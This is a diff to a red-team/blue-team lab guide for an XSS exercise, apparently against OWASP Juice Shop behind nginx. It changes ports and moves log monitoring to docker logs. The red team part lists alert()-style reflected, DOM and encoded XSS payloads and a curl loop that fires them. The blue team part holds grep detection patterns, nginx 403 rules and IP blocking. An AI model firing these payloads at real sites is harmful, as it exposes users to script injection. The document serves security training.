@@ -25,7 +25,7 @@ Red Team will inject malicious scripts into the application while Blue Team dete
 
 ### Target
 ```
-http://<VPS_IP>:8000
+http://<VPS_IP>:8080
 ```
 
 ### Phase 1: Find Injection Points (5 minutes)
@@ -44,10 +44,10 @@ http://<VPS_IP>:8000
 
 ```bash
 # Test if input is reflected in search
-curl "http://<VPS_IP>:8000/rest/products/search?q=<test123>"
+curl "http://<VPS_IP>:8080/rest/products/search?q=<test123>"
 
 # Check if HTML is in response
-curl "http://<VPS_IP>:8000/rest/products/search?q=<b>bold</b>"
+curl "http://<VPS_IP>:8080/rest/products/search?q=<b>bold</b>"
 ```
 
 ---
@@ -58,7 +58,7 @@ curl "http://<VPS_IP>:8000/rest/products/search?q=<b>bold</b>"
 
 #### Attack 1: Reflected XSS in Search
 
-1. Open browser to: `http://<VPS_IP>:8000`
+1. Open browser to: `http://<VPS_IP>:8080`
 2. Use the search bar with this payload:
 
 ```html
@@ -67,14 +67,14 @@ curl "http://<VPS_IP>:8000/rest/products/search?q=<b>bold</b>"
 
 Or try in URL:
 ```
-http://<VPS_IP>:8000/#/search?q=<iframe src="javascript:alert('XSS')">
+http://<VPS_IP>:8080/#/search?q=<iframe src="javascript:alert('XSS')">
 ```
 
 #### Attack 2: DOM-Based XSS
 
 Try the track order feature:
 ```
-http://<VPS_IP>:8000/#/track-result?id=<script>alert('XSS')</script>
+http://<VPS_IP>:8080/#/track-result?id=<script>alert('XSS')</script>
 ```
 
 #### Attack 3: Stored XSS (Contact Form)
@@ -110,7 +110,7 @@ Or URL encoded:
 
 ```bash
 #!/bin/bash
-TARGET="http://<VPS_IP>:8000"
+TARGET="http://<VPS_IP>:8080"
 
 PAYLOADS=(
     "<script>alert(1)</script>"
@@ -139,13 +139,13 @@ done
 
 ```bash
 # URL encoding
-curl "http://<VPS_IP>:8000/rest/products/search?q=%3Cscript%3Ealert(1)%3C/script%3E"
+curl "http://<VPS_IP>:8080/rest/products/search?q=%3Cscript%3Ealert(1)%3C/script%3E"
 
 # Double URL encoding
-curl "http://<VPS_IP>:8000/rest/products/search?q=%253Cscript%253Ealert(1)%253C/script%253E"
+curl "http://<VPS_IP>:8080/rest/products/search?q=%253Cscript%253Ealert(1)%253C/script%253E"
 
 # Unicode encoding
-curl "http://<VPS_IP>:8000/rest/products/search?q=\u003cscript\u003ealert(1)\u003c/script\u003e"
+curl "http://<VPS_IP>:8080/rest/products/search?q=\u003cscript\u003ealert(1)\u003c/script\u003e"
 ```
 
 #### Case Variations
@@ -191,7 +191,7 @@ for encoding in "" "%3C" "\\u003c"; do
     payload="${encoding}script>alert(1)<${encoding}/script>"
     echo "Testing: $payload"
     RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
-        "http://<VPS_IP>:8000/rest/products/search?q=$payload")
+        "http://<VPS_IP>:8080/rest/products/search?q=$payload")
     echo "Response code: $RESPONSE"
 done
 ```
@@ -213,27 +213,39 @@ done
 
 **Objective:** Detect XSS patterns in traffic
 
-#### 1. XSS Detection Command
+#### Log Access via Docker
+
+Blue Team monitors attacks using **Docker logs** (no server SSH required):
 
 ```bash
-# Watch for XSS patterns in real-time
-tail -f ./logs/nginx/access.log | \
-    grep -iE "(<script|javascript:|onerror=|onload=|<iframe|<svg)"
+# Watch all nginx proxy traffic
+docker logs -f nginx-proxy
+
+# Filter for XSS patterns
+docker logs -f nginx-proxy 2>&1 | grep -iE "(<script|javascript:|onerror=|onload=|<iframe|<svg)"
 ```
 
-#### 2. Setup Alert Script
+> **Tip:** Red Team attacks port **8080** → visible in `docker logs nginx-proxy`
+
+#### 1. Start Watching for XSS Patterns
+
+```bash
+# Real-time XSS detection
+docker logs -f nginx-proxy 2>&1 | \
+    grep -iE "(script|javascript|onerror|onload|iframe|svg|img.*=)"
+```
+
+#### 2. XSS Detection Script
 
 ```bash
 #!/bin/bash
 # xss_detector.sh
-LOG="./logs/nginx/access.log"
 
 echo "🔍 XSS Detection Active..."
 
-tail -f "$LOG" | while read line; do
-    if echo "$line" | grep -qiE "(<script|javascript:|onerror|onload|<iframe|<svg|<img.*src.*=)"; then
+docker logs -f nginx-proxy 2>&1 | while read line; do
+    if echo "$line" | grep -qiE "(script|javascript:|onerror|onload|iframe|svg)"; then
         echo "⚠️  XSS DETECTED: $line"
-        echo "$(date) - XSS attempt" >> xss_alerts.log
     fi
 done
 ```
@@ -243,8 +255,9 @@ chmod +x xss_detector.sh
 ./xss_detector.sh
 ```
 
-#### 3. Kibana Search
+#### 3. (Optional) Kibana Search
 
+Access: `http://<VPS_IP>:5601`
 ```
 message: (*script* OR *javascript* OR *onerror* OR *onload*)
 ```
@@ -267,28 +280,26 @@ message: (*script* OR *javascript* OR *onerror* OR *onload*)
 | `<svg>` | SVG-based XSS |
 | `<img src=x` | Image error XSS |
 
-#### Count XSS Attempts
+#### Count XSS Attempts via Docker Logs
 
 ```bash
 # Total XSS attempts
-grep -ciE "(<script|javascript:|onerror|onload)" ./logs/nginx/access.log
+docker logs nginx-proxy 2>&1 | grep -ciE "(script|javascript:|onerror|onload)"
 
 # Group by type
 echo "=== XSS Attempts by Type ==="
-echo "Script tags: $(grep -ci '<script' ./logs/nginx/access.log)"
-echo "Event handlers: $(grep -ciE '(onerror|onload)' ./logs/nginx/access.log)"
-echo "JavaScript protocol: $(grep -ci 'javascript:' ./logs/nginx/access.log)"
-echo "Iframes: $(grep -ci '<iframe' ./logs/nginx/access.log)"
+echo "Script tags: $(docker logs nginx-proxy 2>&1 | grep -ci 'script')"
+echo "Event handlers: $(docker logs nginx-proxy 2>&1 | grep -ciE '(onerror|onload)')"
+echo "JavaScript protocol: $(docker logs nginx-proxy 2>&1 | grep -ci 'javascript')"
+echo "Iframes: $(docker logs nginx-proxy 2>&1 | grep -ci 'iframe')"
 ```
 
-#### Extract Payloads for Analysis
+#### Find Attacker IPs
 
 ```bash
-# Decode and display XSS payloads
-grep -oiE "q=[^&]+" ./logs/nginx/access.log | \
-    sed 's/q=//g' | \
-    python3 -c "import sys,urllib.parse; [print(urllib.parse.unquote(l.strip())) for l in sys.stdin]" | \
-    sort -u
+# IPs with XSS attempts
+docker logs nginx-proxy 2>&1 | grep -iE "(script|onerror|onload)" | \
+    awk '{print $1}' | sort | uniq -c | sort -rn
 ```
 
 ---
@@ -297,98 +308,59 @@ grep -oiE "q=[^&]+" ./logs/nginx/access.log | \
 
 **Objective:** Block XSS attacks at the proxy level
 
-#### Nginx ModSecurity-Style Rules
-
-Create a WAF configuration:
+#### Block Attacker IP via Docker
 
 ```bash
-cat > ./blue-team/config/waf_rules.conf << 'EOF'
-# XSS Protection Rules for Nginx
+# Find attacker IP
+ATTACKER=$(docker logs nginx-proxy 2>&1 | grep -iE "(script|onerror)" | \
+    awk '{print $1}' | sort | uniq -c | sort -rn | head -1 | awk '{print $2}')
 
-# Block requests containing script tags
-if ($request_uri ~* "<script") {
-    return 403;
-}
+echo "Blocking XSS attacker: $ATTACKER"
 
-# Block javascript: protocol
-if ($request_uri ~* "javascript:") {
-    return 403;
-}
-
-# Block common event handlers
-if ($request_uri ~* "(onerror|onload|onmouseover|onclick)=") {
-    return 403;
-}
-
-# Block iframe injection
-if ($request_uri ~* "<iframe") {
-    return 403;
-}
-
-# Block SVG XSS
-if ($request_uri ~* "<svg") {
-    return 403;
-}
-
-# Block img tag XSS
-if ($request_uri ~* "<img[^>]+onerror") {
-    return 403;
-}
-EOF
+# Block inside nginx container
+docker exec nginx-proxy sh -c "echo 'deny $ATTACKER;' >> /etc/nginx/blocked.conf"
+docker exec nginx-proxy nginx -s reload
 ```
 
-#### Updated Nginx Location Block
+#### WAF-Style Rules (optional - for advanced users)
 
-```bash
-cat > ./blue-team/config/secure_location.conf << 'EOF'
+If you have access to update nginx.conf, you can add XSS blocking rules:
+
+```nginx
 location / {
-    # XSS Protection
-    if ($request_uri ~* "(<script|javascript:|onerror=|onload=|<iframe|<svg)") {
+    # Block script tags
+    if ($request_uri ~* "(script|javascript:)") {
         return 403;
     }
     
-    # URL-encoded XSS protection
-    if ($request_uri ~* "(%3Cscript|%3Ciframe|%3Csvg)") {
+    # Block event handlers
+    if ($request_uri ~* "(onerror|onload|onclick)=") {
         return 403;
     }
     
     proxy_pass http://juice-shop:3000;
-    proxy_set_header X-XSS-Protection "1; mode=block";
-    proxy_set_header Content-Security-Policy "script-src 'self'";
+    add_header X-XSS-Protection "1; mode=block";
 }
-EOF
-```
-
-#### Quick IP Block for Active Attacker
-
-```bash
-# Get XSS attacker IP
-ATTACKER=$(grep -iE "(<script|javascript:|onerror)" ./logs/nginx/access.log | \
-    awk '{print $1}' | sort | uniq -c | sort -rn | head -1 | awk '{print $2}')
-
-echo "Blocking XSS attacker: $ATTACKER"
-sudo iptables -A INPUT -s $ATTACKER -j DROP
 ```
 
 ---
 
 ### Phase 4: Verify & Report (10 minutes)
 
-#### Test Your Rules
+#### Verify Block is Working
 
 ```bash
-# Test if WAF is working
-curl -s -o /dev/null -w "%{http_code}" \
-    "http://localhost:8000/rest/products/search?q=<script>alert(1)</script>"
-    
-# Should return 403 if blocked
+# Watch for blocked requests or no more attacks
+docker logs -f nginx-proxy 2>&1 | grep -iE "(script|onerror)"
+
+# If attacker is blocked, their IP won't appear anymore
 ```
 
-#### Monitor Blocked Attempts
+#### Monitor for Blocked Attempts
 
 ```bash
 # Watch for 403 responses (blocked by WAF)
-tail -f ./logs/nginx/access.log | grep " 403 "
+docker logs -f nginx-proxy 2>&1 | grep '" 403 '
 ```
 
 #### Create Incident Report
